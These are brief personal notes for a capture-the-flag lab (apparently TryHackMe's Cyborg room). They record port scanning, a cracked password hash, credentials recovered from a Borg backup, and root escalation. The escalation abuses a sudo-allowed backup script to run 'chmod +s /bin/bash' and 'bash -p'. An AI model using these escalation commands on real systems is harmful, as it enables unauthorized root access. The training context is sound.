nmap: 22 ssh
80 http

dirsearch: /admin
	found: archive.tar at Archive/Download
			Admin Shoutbox at Admins

			/etc/squid/passwd: music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. -> squidward

checking archive.tar 
	working with <borg>
		install borg: sudo apt install borgbackup

		borg list /home/eliot/Desktop/write-ups/thm/cyborg/home/field/dev/final_archive -> found music_archive

		create dir unpacked

		borg mount /home/eliot/Desktop/write-ups/thm/cyborg/home/field/dev/final_archive unpacked

		found note.txt -> ssh cred: alex:S3cretP@s3

-> got user.txt

checking sudo: sudo -l
	(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

checking the script: can pass argument -c to run cmd
	sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"

-> got root.txt

fully compomise: sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash" 
	bash -p 
-> root

